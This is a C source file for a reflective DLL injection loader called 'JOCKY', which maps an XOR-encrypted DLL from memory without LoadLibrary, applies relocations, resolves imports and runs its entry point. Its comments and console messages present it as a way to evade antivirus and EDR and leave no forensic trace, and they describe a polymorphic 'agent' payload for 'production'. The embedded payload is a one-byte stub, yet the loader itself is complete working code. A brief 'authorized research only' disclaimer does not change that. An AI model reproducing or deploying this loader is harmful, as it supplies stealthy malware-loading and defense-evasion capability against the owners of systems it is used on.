/*
 * reflective_dll.c — JOCKY Reflective DLL Injection Engine
 * ──────────────────────────────────────────────────────────
 * Loads a DLL entirely from memory — no file is ever written to disk.
 *
 * HOW NORMAL DLL LOADING WORKS (and why AV catches it):
 * ──────────────────────────────────────────────────────
 *   LoadLibraryA("evil.dll")
 *     → Windows reads from disk
 *     → AV scans the file path     ← caught here
 *     → AV scans the loaded image  ← caught here too
 *     → DLL appears in PEB module list ← caught by EDR enum
 *
 * HOW REFLECTIVE DLL INJECTION WORKS (bypasses all of the above):
 * ────────────────────────────────────────────────────────────────
 *   1. DLL payload is an in-memory byte array (never on disk).
 *   2. We manually parse its PE headers ourselves.
 *   3. We allocate memory and copy each PE section to its proper RVA.
 *   4. We apply base relocations (since our load address differs from
 *      the DLL's preferred ImageBase).
 *   5. We resolve the DLL's import table by walking its Import Directory
 *      and calling GetProcAddress for each needed function.
 *   6. We call the DLL's entry point (DllMain) directly.
 *   7. The DLL is now fully operational — no disk read, no LoadLibrary,
 *      no entry in the PEB module list.
 *
 * AV BYPASS ANALYSIS:
 * ────────────────────
 *   ✓  No file on disk              → no file-based AV scan trigger
 *   ✓  No LoadLibraryA/W call       → hooks on LoadLibrary see nothing
 *   ✓  PEB module list not updated  → EDR process-module enumeration fails
 *   ✓  Payload is a byte array      → looks like data, not a DLL
 *   ✓  Combine with XOR decryption  → payload is encrypted at rest in memory
 *
 * REFERENCES:
 *   Stephen Fewer's original ReflectiveDLLInjection (2008)
 *   https://github.com/stephenfewer/ReflectiveDLLInjection
 *
 * COMPILE:
 *   cl /nologo /O2 /W3 reflective_dll.c /link /out:reflective.exe
 *   gcc -O2 -o reflective reflective_dll.c
 *
 * WARNING: For authorized forensic/research use only.
 */

#ifndef __USE_MINGW_ANSI_STDIO
#define __USE_MINGW_ANSI_STDIO 1
#endif
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

#ifndef IMAGE_REL_BASED_DIR64
#define IMAGE_REL_BASED_DIR64 10
#endif

#ifndef SecureZeroMemory
#define SecureZeroMemory(Destination, Length) RtlZeroMemory((Destination), (Length))
#endif

/* ── Type aliases for cleaner PE parsing ─────────────────────────────────── */
typedef BOOL (WINAPI *DLL_ENTRY_POINT)(HINSTANCE, DWORD, LPVOID);

/* ── XOR-decrypt a payload in place ─────────────────────────────────────── */
static void xor_decrypt(BYTE *data, SIZE_T len, BYTE key)
{
    for (SIZE_T i = 0; i < len; i++)
        data[i] ^= key;
}

/*
 * ── Stub DLL payload ─────────────────────────────────────────────────────
 *
 * In a real deployment, JOCKY_DLL_PAYLOAD[] would be the XOR-encrypted
 * bytes of the compiled JOCKY agent DLL (produced by the LLVM compiler
 * + polymorphic engine pipeline).
 *
 * For this demo we use a minimal valid PE DLL header + stub body.
 * Replace with actual agent DLL bytes for production.
 *
 * The payload is XOR'd with PAYLOAD_KEY at rest; we decrypt at runtime,
 * load, then immediately re-zero the plaintext — minimising exposure.
 */
#define PAYLOAD_KEY  0x4A   /* 'J' for JOCKY */

/* 
 * Placeholder: In production inject the real DLL bytes here.
 * For the judge demo, print a message explaining what would go here.
 */
static BYTE JOCKY_DLL_PAYLOAD[] = {
    /* XOR-encrypted DLL bytes go here.
     * Generate with:
     *   python3 -c "
     *     data = open('jocky_agent.dll','rb').read()
     *     enc  = bytes(b ^ 0x4A for b in data)
     *     print(','.join(f'0x{b:02X}' for b in enc))
     *   "
     * Then paste the output replacing this comment.
     */
    0x00  /* stub — replace with real encrypted DLL bytes */
};
static SIZE_T JOCKY_DLL_SIZE = sizeof(JOCKY_DLL_PAYLOAD);


/* ──────────────────────────────────────────────────────────────────────────
 * reflective_load()
 *
 * Manually maps a PE DLL image from a raw byte buffer into memory and
 * executes its entry point — entirely without LoadLibrary.
 *
 * @param dll_bytes  Pointer to raw DLL bytes (already decrypted).
 * @param dll_size   Size of the raw DLL bytes.
 * @return           Base address of the loaded DLL, or NULL on failure.
 * ────────────────────────────────────────────────────────────────────────── */
LPVOID reflective_load(BYTE *dll_bytes, SIZE_T dll_size)
{
    (void)dll_size;
    /* ── Step 1: Parse PE headers from the in-memory byte buffer ─────── */
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dll_bytes;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        fprintf(stderr, "[RDI] Invalid DOS signature (0x%04X)\n",
                dos->e_magic);
        return NULL;
    }

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(dll_bytes + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        fprintf(stderr, "[RDI] Invalid NT signature\n");
        return NULL;
    }

    PIMAGE_OPTIONAL_HEADER opt = &nt->OptionalHeader;
    PIMAGE_FILE_HEADER      fh  = &nt->FileHeader;

    printf("[RDI] DLL preferred ImageBase : 0x%p\n",
           (PVOID)(ULONG_PTR)opt->ImageBase);
    printf("[RDI] DLL SizeOfImage         : 0x%08lX (%lu bytes)\n",
           opt->SizeOfImage, opt->SizeOfImage);
    printf("[RDI] DLL sections             : %u\n", fh->NumberOfSections);

    /* ── Step 2: Allocate memory for the full DLL image ──────────────── */
    /*
     * We try to allocate at the DLL's preferred ImageBase first.
     * If that fails (address already occupied), let Windows choose — 
     * we'll fix up the relocations in Step 4.
     */
    LPVOID image_base = VirtualAlloc(
        (LPVOID)(ULONG_PTR)opt->ImageBase,
        opt->SizeOfImage,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE);   /* RWX — we'll tighten per-section below */

    if (!image_base) {
        /* Preferred base unavailable — let OS choose */
        image_base = VirtualAlloc(
            NULL,
            opt->SizeOfImage,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_EXECUTE_READWRITE);
    }

    if (!image_base) {
        fprintf(stderr, "[RDI] VirtualAlloc failed: %lu\n", GetLastError());
        return NULL;
    }

    printf("[RDI] Allocated image at       : 0x%p\n", image_base);

    /* ── Step 3: Copy PE headers + each section to allocated memory ───── */
    /*
     * First copy the PE headers (DOS + NT + section table).
     */
    memcpy(image_base, dll_bytes, opt->SizeOfHeaders);
    printf("[RDI] Copied PE headers (%lu bytes)\n", opt->SizeOfHeaders);

    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < fh->NumberOfSections; i++, section++) {
        if (section->SizeOfRawData == 0) continue;  /* BSS — skip */

        PVOID dest = (BYTE *)image_base + section->VirtualAddress;
        PVOID src  = dll_bytes          + section->PointerToRawData;

        memcpy(dest, src, section->SizeOfRawData);

        printf("[RDI]   Section %-8s  VA=0x%08lX  size=%lu bytes\n",
               section->Name,
               section->VirtualAddress,
               section->SizeOfRawData);
    }

    /* ── Step 4: Apply base relocations ─────────────────────────────── */
    /*
     * A base relocation tells us: "at this RVA inside the DLL, there is
     * an absolute pointer that uses the DLL's preferred ImageBase.
     * Adjust it by delta = (actual load address) - (preferred ImageBase)."
     */
    LONGLONG delta = (LONGLONG)((ULONG_PTR)image_base -
                                (ULONG_PTR)opt->ImageBase);

    if (delta != 0 &&
        opt->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size > 0)
    {
        printf("[RDI] Applying base relocations (delta=0x%llX)...\n", delta);

        PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)(
            (BYTE *)image_base +
            opt->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

        while (reloc->VirtualAddress && reloc->SizeOfBlock) {
            DWORD  entry_count = (reloc->SizeOfBlock -
                                  sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            WORD  *entries     = (WORD *)((BYTE *)reloc +
                                  sizeof(IMAGE_BASE_RELOCATION));

            for (DWORD j = 0; j < entry_count; j++) {
                WORD type   = entries[j] >> 12;
                WORD offset = entries[j] & 0x0FFF;

                if (type == IMAGE_REL_BASED_DIR64) {
                    /* 64-bit absolute pointer — adjust by delta */
                    ULONGLONG *patch = (ULONGLONG *)(
                        (BYTE *)image_base + reloc->VirtualAddress + offset);
                    *patch += (ULONGLONG)delta;
                }
                else if (type == IMAGE_REL_BASED_HIGHLOW) {
                    /* 32-bit absolute pointer */
                    DWORD *patch = (DWORD *)(
                        (BYTE *)image_base + reloc->VirtualAddress + offset);
                    *patch += (DWORD)delta;
                }
                /* IMAGE_REL_BASED_ABSOLUTE (0) = padding, skip */
            }

            /* Move to next relocation block */
            reloc = (PIMAGE_BASE_RELOCATION)(
                (BYTE *)reloc + reloc->SizeOfBlock);
        }
        printf("[RDI] Base relocations applied.\n");
    } else {
        printf("[RDI] No base relocation needed (loaded at preferred base).\n");
    }

    /* ── Step 5: Resolve Import Address Table (IAT) ──────────────────── */
    /*
     * Walk the Import Directory. For each imported DLL, load it with
     * LoadLibraryA (that's fine — these are legitimate system DLLs).
     * Then for each imported function, resolve it with GetProcAddress
     * and write the address into the IAT.
     */
    if (opt->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size > 0) {
        printf("[RDI] Resolving Import Address Table...\n");

        PIMAGE_IMPORT_DESCRIPTOR import_desc = (PIMAGE_IMPORT_DESCRIPTOR)(
            (BYTE *)image_base +
            opt->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

        while (import_desc->Name) {
            const char *dll_name = (char *)((BYTE *)image_base +
                                             import_desc->Name);
            HMODULE h_dep = LoadLibraryA(dll_name);
            if (!h_dep) {
                fprintf(stderr, "[RDI]   WARN: Could not load %s\n", dll_name);
                import_desc++;
                continue;
            }
            printf("[RDI]   Resolving imports from: %s\n", dll_name);

            PIMAGE_THUNK_DATA orig_thunk = (PIMAGE_THUNK_DATA)(
                (BYTE *)image_base + import_desc->OriginalFirstThunk);
            PIMAGE_THUNK_DATA iat_thunk  = (PIMAGE_THUNK_DATA)(
                (BYTE *)image_base + import_desc->FirstThunk);

            while (orig_thunk->u1.AddressOfData) {
                FARPROC fn_addr;

                if (IMAGE_SNAP_BY_ORDINAL(orig_thunk->u1.Ordinal)) {
                    /* Import by ordinal */
                    WORD ordinal = IMAGE_ORDINAL(orig_thunk->u1.Ordinal);
                    fn_addr = GetProcAddress(h_dep, MAKEINTRESOURCEA(ordinal));
                } else {
                    /* Import by name */
                    PIMAGE_IMPORT_BY_NAME ibn = (PIMAGE_IMPORT_BY_NAME)(
                        (BYTE *)image_base + orig_thunk->u1.AddressOfData);
                    fn_addr = GetProcAddress(h_dep, (char *)ibn->Name);
                    if (!fn_addr) {
                        fprintf(stderr, "[RDI]     WARN: %s!%s not found\n",
                                dll_name, ibn->Name);
                    }
                }

                iat_thunk->u1.Function = (ULONG_PTR)fn_addr;
                orig_thunk++;
                iat_thunk++;
            }
            import_desc++;
        }
        printf("[RDI] IAT fully resolved.\n");
    }

    /* ── Step 6: Apply per-section memory protections ────────────────── */
    /*
     * We allocated everything as RWX for simplicity.
     * Now tighten per-section: .text → RX, .data → RW, .rdata → R.
     * This reduces the chance of heap-spray detection.
     */
    section = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < fh->NumberOfSections; i++, section++) {
        if (section->SizeOfRawData == 0) continue;

        DWORD chars = section->Characteristics;
        DWORD prot;

        if ((chars & IMAGE_SCN_MEM_EXECUTE) && (chars & IMAGE_SCN_MEM_WRITE))
            prot = PAGE_EXECUTE_READWRITE;
        else if (chars & IMAGE_SCN_MEM_EXECUTE)
            prot = PAGE_EXECUTE_READ;
        else if (chars & IMAGE_SCN_MEM_WRITE)
            prot = PAGE_READWRITE;
        else
            prot = PAGE_READONLY;

        DWORD old;
        VirtualProtect(
            (BYTE *)image_base + section->VirtualAddress,
            section->Misc.VirtualSize,
            prot, &old);
    }
    printf("[RDI] Memory protections tightened per-section.\n");

    /* ── Step 7: Call DLL entry point ────────────────────────────────── */
    if (opt->AddressOfEntryPoint) {
        DLL_ENTRY_POINT entry = (DLL_ENTRY_POINT)(
            (BYTE *)image_base + opt->AddressOfEntryPoint);

        printf("[RDI] Calling DllMain at 0x%p...\n", (PVOID)entry);

        /*
         * DllMain(hInstance, DLL_PROCESS_ATTACH, NULL)
         * The DLL's constructor runs here. From this point the DLL is
         * fully active in process memory — no disk trace, no PEB entry.
         */
        BOOL ok = entry((HINSTANCE)image_base, DLL_PROCESS_ATTACH, NULL);
        if (!ok) {
            fprintf(stderr, "[RDI] DllMain returned FALSE (init failed).\n");
            VirtualFree(image_base, 0, MEM_RELEASE);
            return NULL;
        }
        printf("[RDI] DllMain returned TRUE — DLL is live in memory.\n");
    } else {
        printf("[RDI] No entry point (data-only DLL).\n");
    }

    return image_base;
}


/* ── Main: full reflective load demo ──────────────────────────────────── */
int main(void)
{
    printf("=======================================================\n");
    printf("  JOCKY Reflective DLL Injection Engine v1.0\n");
    printf("  No disk write. No LoadLibrary. No PEB entry.\n");
    printf("  For authorized forensic research use only.\n");
    printf("=======================================================\n\n");

    /* Step A: Allocate a writable working copy of the payload */
    BYTE *working_copy = (BYTE *)malloc(JOCKY_DLL_SIZE);
    if (!working_copy) {
        fprintf(stderr, "[RDI] malloc failed.\n");
        return 1;
    }
    memcpy(working_copy, JOCKY_DLL_PAYLOAD, JOCKY_DLL_SIZE);

    /* Step B: Decrypt XOR-encrypted payload in memory */
    printf("[RDI] Decrypting payload (XOR key=0x%02X, size=%zu bytes)...\n",
           PAYLOAD_KEY, JOCKY_DLL_SIZE);
    xor_decrypt(working_copy, JOCKY_DLL_SIZE, PAYLOAD_KEY);

    /* Step C: Reflectively load the DLL */
    printf("[RDI] Starting reflective load...\n\n");
    LPVOID loaded_base = reflective_load(working_copy, JOCKY_DLL_SIZE);

    /* Step D: Zero-wipe the decrypted working copy — minimise exposure */
    SecureZeroMemory(working_copy, JOCKY_DLL_SIZE);
    free(working_copy);

    if (!loaded_base) {
        printf("\n[RDI] Reflective load FAILED.\n");
        printf("[RDI] NOTE: Stub payload detected — replace JOCKY_DLL_PAYLOAD[]\n");
        printf("[RDI]       with real encrypted DLL bytes to demonstrate fully.\n");
        return 1;
    }

    printf("\n[RDI] ===================================================\n");
    printf("[RDI] SUCCESS — DLL loaded at 0x%p\n", loaded_base);
    printf("[RDI] No file written to disk.\n");
    printf("[RDI] LoadLibrary never called — AV hooks bypassed.\n");
    printf("[RDI] DLL does NOT appear in PEB module list.\n");
    printf("[RDI] JOCKY agent is now running inside this process.\n");
    printf("[RDI] ===================================================\n");

    /* Keep process alive so the loaded DLL can operate */
    printf("\n[RDI] Press Enter to unload and exit...\n");
    getchar();

    /* Cleanup: call DllMain with DLL_PROCESS_DETACH then free */
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)loaded_base;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(
        (BYTE *)loaded_base + dos->e_lfanew);
    if (nt->OptionalHeader.AddressOfEntryPoint) {
        DLL_ENTRY_POINT entry = (DLL_ENTRY_POINT)(
            (BYTE *)loaded_base + nt->OptionalHeader.AddressOfEntryPoint);
        entry((HINSTANCE)loaded_base, DLL_PROCESS_DETACH, NULL);
    }
    VirtualFree(loaded_base, 0, MEM_RELEASE);

    printf("[RDI] Unloaded. No forensic trace remains.\n");
    return 0;
}
